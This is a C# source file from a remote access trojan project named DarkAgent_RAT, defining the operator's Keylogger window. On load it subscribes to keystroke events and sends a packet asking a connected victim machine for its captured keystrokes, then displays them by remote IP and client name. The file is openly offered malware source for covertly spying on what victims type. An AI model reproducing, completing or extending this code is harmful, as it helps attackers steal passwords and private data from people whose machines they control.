using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_RAT
{
    public partial class Keylogger : DevComponents.DotNetBar.Office2007Form
    {
        public Keylogger()
        {
            InitializeComponent();
        }

        public string RemoteIP;
        public string ClientName;
        public int ClientID;

        #region Specific Events

        public void onGetKeyStrokes(object o, KeyloggerEventArgs e)
        {
            try
            {
                if (e.RemoteIP!= RemoteIP)
                    return;

                richTextBox1.Text = e.KeyStrokes;
            }
            catch {}
        }

        #endregion

        #region Form Events

        private void Keylogger_Load(object sender, EventArgs e)
        {
            this.Text = "DarkAgent - DarkAgent [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "]";
            KeyloggerEvent.KeyStrokes += new KeyloggerHandler(onGetKeyStrokes);
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_GetKeyStrokes(RatClientProcessor.Instance._clientList[ClientID]));
        }

        #endregion
    }
}